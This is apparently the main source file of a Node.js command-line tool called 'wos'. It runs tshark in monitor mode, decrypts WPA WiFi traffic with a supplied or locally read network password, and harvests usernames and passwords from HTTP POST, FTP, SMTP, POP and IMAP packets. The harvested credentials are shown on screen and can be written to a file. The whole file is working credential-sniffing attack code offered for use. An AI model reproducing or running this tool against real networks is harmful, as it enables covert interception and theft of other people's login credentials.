const fs = require('fs')
const qs = require('qs')
const path = require('path');
const {exec}= require('shelljs')
const meow = require('meow')
const {sync:commandExists} = require('command-exists')
const wifiInterface = require('wifi-interface')
const wifiSecurity = require('wifi-security')
const {sync:wifiName} = require('wifi-name')
const wifiPassword = require('wifi-password')

const formatPacket = require(`./src/formatPacket`)
const Gui = require(`./src/Gui`)
const {userFields, passFields} = require(`./src/fields`)

const cli = meow(`
    Usage
  $ wos [options]

    Info
      Capture interface is required. Use ifconfig command to find interfaces.

      SSID and password are required if using secured wifi such as WPA or WEP in order to decrypt packets.

      Wrap SSID and password in single quotes in order to escape special characters.

      After running wos, devices must send perform the EAPOL handshake in order for wos to decrypt their traffic. The handshake is initiated when the device connects or reconnects to the network.

    Options
      -i, --interface Capture interface
      -s, --ssid Wifi SSID
      -p, --pass Wifi password
      -n, --no-monitor Disable monitor mode
      -f, --format Format: dash (default), text
      -o, --outfile Output file

    Examples
      $ wos -i en0 --ssid='HomeWifi' --pass='d4Pazsw0rD' -o data.txt
`)

;(async () => {
const {flags} = cli
const ssid = process.env.WOS_SSID || flags.ssid || flags.s || wifiName()
let pass = process.env.WOS_PASS || flags.pass || flags.p
const interface = process.env.WOS_INTERFACE || flags.interface || flags.i || wifiInterface()
const disableMonitor = process.env.WOS_NO_MONITOR || flags.n || flags.noMonitor || (flags.monitor != null ? true : false)
const outfile = process.env.WOS_OUTPUT || flags.o || flags.outfile
let format = process.env.WOS_FORMAT || flags.f || flags.format

let isOpen = (wifiSecurity() === 'none')

if (!pass && !isOpen) {
  try {
    pass = await wifiPassword()
  } catch (error) {

  }
}

if (!(format === 'dash' || format === 'text')) {
  format = 'dash'
}

if (!interface) {
  cli.showHelp()
  process.exit(0)
}

if (!commandExists('tshark')) {
  console.error('tshark command was not found. Please install wireshark https://www.wireshark.org/download.html')
  process.exit(0)
}

const monitor = disableMonitor ? '' : '-I'
let decKeys = ''

if (pass) {
  decKeys = `-o \"uat:80211_keys:\\\"wpa-pwd\\\",\\\"${pass}:${ssid}\\\"\"`
}

const cmd = `tshark ${monitor} -i ${interface} -o wlan.enable_decryption:TRUE ${decKeys} -T ek -V -Y \"tcp.port==80 or udp.port==80 or tcp.port==21 or tcp.port==110 or tcp.port==143 or tcp.port==25 or eapol\" 2> /dev/null`

const gui = new Gui(format)

// start capture
const child = exec(cmd, {async: true, silent: true})

function repairJsonString(data) {
  return data.replace(/Form item: "(.*)" = "(.*)""/, function(match, p1, p2, offset, string) {
    return `Form item: \\"${p1}\" = \\"${p2}\\""`
  })
  .replace(/"tcp_flags_tcp_flags_str": ".*?",/, '')
}

child.stdout
.on('data', (data) => {
  const lines = data.split(/\}\n/).map(x => `${x}}`)

  lines.forEach(line => {
    line = line.replace(/[\n\r]/gi, '')

    try {
      const json = JSON.parse(repairJsonString(line))

      if (json.layers) {
        processLayers(json.layers)
      }
    } catch(error) {

    }
  })
})

if (process.platform === 'darwin') {
  const airportBin = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

  const infoChild = exec(`${airportBin} -I`, {async: true, silent: true})
  infoChild.stdout.on('data', line => {
    if (line) {
      line.split('\n').forEach(x => {
        gui.infoLogAddRow(x)
      })
    }
  })

} else {
  gui.infoLogAddRow('Could not show wifi info')
}

function processLayers (layers) {
  if (typeof layers !== 'object') {
    return false
  }

  const {
    port,
    method,
    host,
    dstport,
    dstip,
    srcip,
    srcmac,
    httpData,
    eapolDataLen,
    wlanMac,
    wlanMacResolved,
    fullRequestUri,
    ftp,
    smtp,
    pop,
    imap
  } = formatPacket(layers)

  /*
   * the fourth and final eapol packet finalizes the handshake
   * between client and router so there is no data.
   * EAPOL packets exchange PMK keys.
   */

  if (eapolDataLen === '0') {
    gui.connectionsLogAddRow(`${wlanMacResolved} ${wlanMac}`)
  }

  let account = ''
  let password = ''

  const isHTTP = (port == 80)
  const isFTP = (port == 21)
  const isPOP = (port == 110)
  const isIMAP = (port == 143)
  const isSMTP = (port == 25)
  const isHTTPPost = (method === 'POST')

  if (isHTTP) {
    if (isHTTPPost) {
      let obj = null

      try {
        obj = JSON.parse(httpData)
      } catch(error) {
        obj = qs.parse(httpData)
      }

      var keys = Object.keys(obj)
      keys.forEach(key => {
        if (userFields.indexOf(key) > -1) {
          account = obj[key]
        } else if (passFields.indexOf(key) > -1) {
          password = obj[key]
        }
      })
    }

    if (isImage(fullRequestUri)) {
      gui.imageLogAddRow(fullRequestUri)
    }
  } else if (isFTP) {
    if (ftp) {
      const str = JSON.stringify(ftp)
      const userRegex = /USER (.*)\\r/i;
      const passRegex = /PASS (.*)\\r/i;

      if (userRegex.test(str)) {
        const match = str.match(userRegex)

        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isSMTP) {
    if (smtp) {
      const str = JSON.stringify(smtp)
      const userRegex = /username":"(.*)"/i
      const passRegex = /password":"(.*)"/i

      if (userRegex.test(str)) {
        const match = str.match(userRegex)
        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isPOP) {
    if (pop) {
      const str = JSON.stringify(pop)
      const userRegex = /USER (.*)/i;
      const passRegex = /PASS (.*)/i;

      if (userRegex.test(str)) {
        const match = str.match(userRegex)

        if (match && match.length > 1) {
          account =  match[1].trim().replace(/\\$/, '')
        }
      } else if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  } else if (isIMAP) {
    if (imap) {
      const str = JSON.stringify(imap)
      const passRegex = /LOGIN (.*?)\}/i;

      if (passRegex.test(str)) {
        const match = str.match(passRegex)
        if (match && match.length > 1) {
          password =  match[1].trim().replace(/\\$/, '')
        }
      }
    }
  }

  if (
    (isHTTPPost || isFTP || isPOP  || isIMAP || isSMTP) &&
    (account || password || httpData)) {
    const row = [account||'', password||'', port||'', host||'', dstip||'', srcip||'', srcmac||'', httpData||'']

    gui.addRow(row)

    if (outfile) {
      fs.appendFile(outfile, row.join('\t'), () => {})
    }
  }
}

function isImage (uri) {
  if (!uri) return false

  const pattern = /\.(png|gif|jpe?g|bmp)$/i

  return pattern.test(uri)
}
})()

// quit with ctrl-c
process.stdin.setRawMode(true)
process.stdin.on('data', function(b) {
  if (b[0] === 3) {
    process.stdin.setRawMode(false)
    process.exit()
  }
})
